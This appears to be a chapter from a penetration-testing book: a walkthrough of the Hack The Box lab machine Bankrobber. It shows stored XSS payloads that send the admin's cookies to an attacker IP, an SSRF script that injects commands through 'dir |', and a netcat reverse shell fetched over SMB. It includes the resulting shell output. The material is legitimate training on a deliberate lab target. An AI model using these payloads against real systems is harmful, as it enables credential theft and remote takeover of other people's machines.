# Exercise: Discovering XSS on Bankrobber

An nmap scan reveals that Bankrobber is a Windows box and has HTTP running on ports 80 and 443, SMB on port 445 and MariaDB on port 3306:

```bash
┌─[rin@parrot]─[~/boxes/Bankrobber]
└──╼ $sudo nmap -v -sC -sV -T4 --min-rate 1000 -p- bankrobber.htb \
    -oA nmap/full-tcp
<SNIP>
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp open ssl/http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: Bad request!
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after: 2019-11-08T23:48:47
| MD5: a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
|_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_ http/1.1
445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds 
    (workgroup: WORKGROUP)
3306/tcp open mysql MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

MariaDB is very similar to MySQL and uses the same SQL syntax. After navigating to the URL [http://bankrobber.htb](http://bankrobber.htb) we find a Bitcoin trading platform called E-coin.

![Home page of Bankrobber](../.gitbook/assets/0%20%281%29%20%282%29.png)

There is a login function and below that a place to register new accounts. If we register an account with username 'john' and password 'password' and then login, we are taken to a page that allows us to transfer E-coin to \(presumably\) another user using the ID of the user.

![Transfer E-coin function of Bankrobber](../.gitbook/assets/1%20%283%29.png)

If we right click on the page and select Inspect Element to go into the developer tools of the browser, we can navigate to the Storage tab and look at the Cookies that have been set. The cookies are:

```text
id: 3
password: cGFzc3dvcmQ%3D
username: am9obg%3D%3D
```

The username and password cookies are simply the Base64 encoded versions of "john" and "password" which you can verify for yourself. We can see that the id of the user is 3 and so it suggests that there are at least 2 other users \(1 and 2\) on the system.

If we submit a transaction by entering 100 as the amount, 2 as the id and a comment of "test", a popup reports "Transfer on hold. An admin will review it within a minute. After that he will decide whether the transaction will be dropped or not.".

This suggests that a person will be reviewing the transfer and so anything we put in the comment field is likely to be rendered when the admin views it. This makes the comment field a candidate for cross-site scripting. To test this, let us start a Python web server on our box:

```bash
┌─[rin@parrot]─[~/boxes/Bankrobber]
└──╼ $sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)
```

We can then create a new transaction and put the following HTML into the comment field:

```javascript
<img src=http://10.10.14.29/img.jpg />
```

This eventually hits the Python web server, and we get the request:

```bash
┌─[rin@parrot]─[~/boxes/Bankrobber]
└──╼ $sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.70.254 - - [25/Feb/2021 10:38:08] code 404, message File not found
10.129.70.254 - - [25/Feb/2021 10:38:08] "GET /img.jpg HTTP/1.1" 404 -
```

So we know that XSS works. The first thing we can do is to steal the administrator's cookies. We know that the cookies used on the site simply consist of the username and password Base64 encoded. To get them we can use the JavaScript function document.cookie\(\) in the following way:

```javascript
<img src=x onerror=this.src="http://10.10.14.135/?c="+document.cookie />
```

This returns the base64 for both username and password to be "admin" and "Hopelessromantic":

```text
10.129.70.254 - - <SNIP> "GET /?c=username=YWRtaW4%3D;
    %20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 200 -
```

After doing the SQL Injection to read source code \(see later in the SQL injection section\), you discover a php file called backdoorchecker.php that will execute a "dir" command supplied as POST parameter. However, the check only tests if the first three characters are equal to "dir". By adding a "\|" after "dir" you can add any other Windows command. The file backdoorchecker.php also checks that the request came from the same machine checking that the "REMOTE\_ADDR" is equal to "::1" the IPv6 localhost address.

To exploit backdoorchecker.php, you can use the XSS to do an SSRF attack. To validate that this will work, you will write a JavaScript file hosted from our machine and test a "ping" command. Writing a script attack.js as follows:

```javascript
var xhr = new XMLHttpRequest();
var url = "http://localhost/admin/backdoorchecker.php";
var params = "cmd=dir | ping -n 5 10.10.14.29";
xhr.open("POST", url);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials=true;
xhr.send(params);
```

To check that the ping is being sent, you can start tcpdump to collect the ping packets which are of the type ICMP:

```bash
┌─[rin@parrot]─[~/boxes/Bankrobber]
└──╼ $sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

To initiate the XSS you can use the script tag instead of the img tag. This will fetch and execute the script attack.js:

```javascript
<script src="http://10.10.14.135/attack.js"></script>
```

Once the script is fetched from the server, you should see tcpdump reporting the pings being sent to our box:

```bash
12:26:08.465546 IP bankrobber.htb > 10.10.14.135: ICMP echo request, 
    id 1, seq 1, length 40
12:26:08.465571 IP 10.10.14.135 > bankrobber.htb: ICMP echo reply, 
    id 1, seq 1, length 40
12:26:08.465586 IP bankrobber.htb > 10.10.14.135: ICMP echo request, 
    id 1, seq 2, length 40
12:26:08.465592 IP 10.10.14.135 > bankrobber.htb: ICMP echo reply, 
    id 1, seq 2, length 40
<SNIP>
```

We haven't dealt with exploitation and how to get access to an interactive session on a remote box, however we will quickly get a "reverse shell" on the Bankrobber box using Netcat. Netcat for windows can be downloaded from [https://eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/). Take a copy of the nc64.exe and rename as nc.exe in your working directory.

As you are targeting a Windows box, you can provide access to netcat via SMB using a tool smbserver.py which is part of the Impacket tools.

{% hint style="info" %}
To install Impacket in the /opt directory, you can use:

`git clone https://github.com/SecureAuthCorp/impacket.git`
{% endhint %}

You can then run smbserver.py directly from /opt/impacket/examples/smbserver.py

\([https://github.com/SecureAuthCorp/impacket\](https://github.com/SecureAuthCorp/impacket\)\). To share a directory using smbserver you use the syntax:

```bash
┌─[✗]─[rin@parrot]─[~/boxes/Bankrobber]
└──╼ $sudo python3 /opt/impacket/examples/smbserver.py share $(pwd) -smb2support
```

We can then modify attack.js to the following:

```javascript
var xhr = new XMLHttpRequest();
var url = "http://localhost/admin/backdoorchecker.php";
var params = "cmd=dir | \\\\10.10.14.135\\share\\nc.exe 10.10.14.135" +
             " 6001 -e cmd.exe";
xhr.open("POST", url);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials=true;
xhr.send(params);
```

We would start the webserver to serve the JavaScript file and netcat listener to receive the incoming connection for the reverse shell:

```bash
┌─[oztechmuse@parrot]─[~/boxes/Bankrobber]
└──╼ $nc -lvnp 6001
listening on [any] 6001 ...
connect to [10.10.14.135] from (UNKNOWN) [10.129.103.158] 49736
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.
C:\xampp\htdocs\admin>whoami
whoami
bankrobber\cortin
```

This is not the end of the box, we have a reverse shell as the user cortin but the next part is privilege escalation which involves a buffer overflow, something we will deal with in Chapter 6.

